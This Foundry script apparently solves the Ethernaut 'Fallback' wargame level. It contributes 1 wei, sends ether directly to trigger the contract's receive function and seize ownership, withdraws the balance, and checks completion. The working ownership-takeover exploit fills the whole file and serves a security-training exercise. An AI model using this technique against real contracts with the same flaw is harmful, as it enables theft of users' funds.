// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Fallback} from "../src/1-Fallback.sol";
import {FallbackFactory} from "../src/FallbackFactory.sol";
import {Script, console} from "forge-std/Script.sol";

contract FallbackSolution is Script {
    Fallback public fallbackLevel;

    function run() external {
        // FallbackFactory fallbackFact = new FallbackFactory();
        // address payable instanceAddress = payable(
        //     fallbackFact.createInstance(vm.envAddress("PUBLIC_KEY"))
        // );
        address payable instanceAddress = payable(
            0x365B4ae473CdFabf4a2752ebe2E285ADCc3eD382
        );
        fallbackLevel = Fallback(instanceAddress);

        console.log("Initial Owner: %s", fallbackLevel.owner());

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        fallbackLevel.contribute{value: 1 wei}();
        console.log("Contributions: %s", fallbackLevel.getContribution());

        address(fallbackLevel).call{value: 1 wei}("");
        console.log("New Owner: %s", fallbackLevel.owner());
        console.log("My Address: %s", vm.envAddress("PUBLIC_KEY"));

        fallbackLevel.withdraw();
        vm.stopBroadcast();

        bool isValidated = new FallbackFactory().validateInstance(
            instanceAddress,
            vm.envAddress("PUBLIC_KEY")
        );

        console.log("Challenge Completed: %s", isValidated);
    }
}
